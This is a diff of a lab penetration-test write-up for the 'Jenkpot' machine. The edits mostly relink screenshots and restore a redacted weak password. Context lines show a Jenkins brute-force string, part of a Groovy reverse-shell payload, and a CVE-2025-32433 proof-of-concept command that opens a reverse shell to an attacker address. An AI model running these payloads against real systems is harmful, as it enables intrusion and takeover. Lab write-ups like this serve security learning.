@@ -28,7 +28,7 @@ This report details the successful compromise of the Jenkpot machine, achieving 
 sudo nmap -T4 -sV -sS -O -p- 10.15.1.247
 ```
 
-![nmap.png](attachment:a8e819b5-15c7-450d-bed7-0b0ddb01ca2b:nmap.png)
+![nmap.png](./screenshots/nmap.png)
 
 ---
 
@@ -44,7 +44,7 @@ sudo nmap -T4 -sV -sS -O -p- 10.15.1.247
 
 The website presents a corporate landing page for "TechVision - Digital Agency" with contact forms and service information.
 
-![Screenshot_2026-02-19_02-49-15.png](attachment:f4fd752d-64a1-4839-8763-b2911145506a:Screenshot_2026-02-19_02-49-15.png)
+![Screenshot_2026-02-19_02-49-15.png](./screenshots/Screenshot_2026-02-19_02-49-15.png)
 
 ### Directory Enumeration
 
@@ -58,7 +58,7 @@ feroxbuster -u http://10.15.1.247 -w /usr/share/wordlists/dirbuster/directory-li
 
 Jenkins automation server identified, running version 2.504.2 on Jetty 12.0.19.
 
-![Screenshot_2026-02-19_02-53-35.png](attachment:5f81325e-6b5a-4565-af21-e4039f824bce:Screenshot_2026-02-19_02-53-35.png)
+![Screenshot_2026-02-19_02-53-35.png](./screenshots/Screenshot_2026-02-19_02-53-35.png)
 
 ### Technology Stack
 
@@ -73,7 +73,7 @@ whatweb http://10.15.1.247:8080
 - HTTPOnly session cookies
 - X-Jenkins headers present
 
-![Screenshot_2026-02-19_02-56-18.png](attachment:d3862c3f-fbd4-4062-9aa7-03017531c280:Screenshot_2026-02-19_02-56-18.png)
+![Screenshot_2026-02-19_02-56-18.png](./screenshots/Screenshot_2026-02-19_02-56-18.png)
 
 ---
 
@@ -98,7 +98,7 @@ http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:logi
 - Username: **admin**
 - Password: **jenkins**
 
-![Screenshot_2026-02-19_02-59-50.png](attachment:5cfe7198-d67d-44d5-983f-53ff1e1c1a53:Screenshot_2026-02-19_02-59-50.png)
+![Screenshot_2026-02-19_02-59-50.png](./screenshots/Screenshot_2026-02-19_02-59-50.png)
 
 ## Remote Code Execution via Groovy Script Console
 
@@ -108,7 +108,7 @@ With authenticated access to Jenkins, the Script Console was accessible at:
 http://10.15.1.247:8080/script
 ```
 
-![Screenshot_2026-02-19_04-04-47.png](attachment:492d581c-5710-4be2-8f32-122f42476c33:Screenshot_2026-02-19_04-04-47.png)
+![Screenshot_2026-02-19_04-04-47.png](./screenshots/Screenshot_2026-02-19_04-04-47.png)
 
 ### Reverse Shell Payload
 
@@ -140,7 +140,7 @@ while(!s.isClosed()){
 p.destroy();s.close();
 ```
 
-![Screenshot_2026-02-19_02-07-21.png](attachment:02a229a6-fd87-4190-bc3b-b5a5a45205fb:f04d5535-f784-47c2-9211-dce6768e89eb.png)
+![Screenshot_2026-02-19_02-07-21.png](./screenshots/Screenshot_2026-02-19_02-07-21.png)
 
 ### Shell Stabilization
 
@@ -154,7 +154,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 - Shell: `/bin/bash`
 - Working Directory: `/var/lib/jenkins`
 
-![Screenshot_2026-02-19_04-10-26.png](attachment:88fa1105-dace-415b-8d6c-09594ac492ef:Screenshot_2026-02-19_04-10-26.png)
+![Screenshot_2026-02-19_04-10-26.png](./screenshots/Screenshot_2026-02-19_04-10-26.png)
 
 ---
 
@@ -179,7 +179,7 @@ ss -tlnp
 127.0.0.1:2222
 ```
 
-![Screenshot_2026-02-19_04-12-03.png](attachment:9e9ff030-b818-4b91-9ec4-51e9e1b7c387:Screenshot_2026-02-19_04-12-03.png)
+![Screenshot_2026-02-19_04-12-03.png](./screenshots/Screenshot_2026-02-19_04-12-03.png)
 
 Vulnerability: CVE-2025-32433 (Erlang OTP SSH RCE)
 
@@ -195,7 +195,7 @@ Vulnerability: CVE-2025-32433 (Erlang OTP SSH RCE)
 
 cloned git hub repo https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC
 
-![photo_2026-02-19_05-08-33.jpg](attachment:99a02f94-cbf4-49d7-a0ad-93b83123a6b6:photo_2026-02-19_05-08-33.jpg)
+![photo_2026-02-19_05-08-33.jpg](./screenshots/photo_2026-02-19_05-08-33.jpg)
 
 **Attacker Machine (Second Listener):**
 
@@ -210,7 +210,7 @@ cd /CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC
 python3 cve-2025-32433.py 127.0.0.1 -p 2222 --shell --lhost 10.8.0.163 --lport 1234
 ```
 
-![Screenshot_2026-02-19_05-11-29.png](attachment:5c9e2e0b-7443-43d0-8e2b-d907e055b6ff:Screenshot_2026-02-19_05-11-29.png)
+![Screenshot_2026-02-19_05-11-29.png](./screenshots/Screenshot_2026-02-19_05-11-29.png)
 
 ### Root Access Obtained
 
@@ -225,7 +225,7 @@ hostname
 # jenkpot
 ```
 
-![Screenshot_2026-02-19_05-12-38.png](attachment:6591d9f6-9d7f-47d0-a169-8226e2429c45:Screenshot_2026-02-19_05-12-38.png)
+![Screenshot_2026-02-19_05-12-38.png](./screenshots/Screenshot_2026-02-19_05-12-38.png)
 
 ---
 
@@ -241,9 +241,9 @@ cat /root/root.txt
 # 8fc6105c911834ba1c1322cf10745a2a
 ```
 
-![Screenshot_2026-02-19_05-20-11.png](attachment:3ae7db17-9a5b-4690-ac1c-770a34be4aef:92a75c1a-8a55-4d95-8123-b6179d9844b2.png)
+![Screenshot_2026-02-19_05-20-11.png](./screenshots/Screenshot_2026-02-19_05-20-11.png)
 
-![Screenshot_2026-02-19_05-19-55.png](attachment:86116599-cc66-4af5-9c7f-14901e19b9fe:5f1faecf-eee4-4554-9884-f0c8acafd66c.png)
+![Screenshot_2026-02-19_05-19-55.png](./screenshots/Screenshot_2026-02-19_05-19-55.png)
 
 ## Persistence
 
@@ -261,7 +261,7 @@ Attack Chain Visualization
 
 1. Reconnaissance (Nmap) → Identified Jenkins on port 8080
                                                ↓
-2. Brute Force Attack → Weak credentials discovered (admin:[PASS])
+2. Brute Force Attack → Weak credentials discovered (admin:jenkins)
                                                ↓
 3. Jenkins Access → Authenticated to Jenkins web interface
                                                ↓
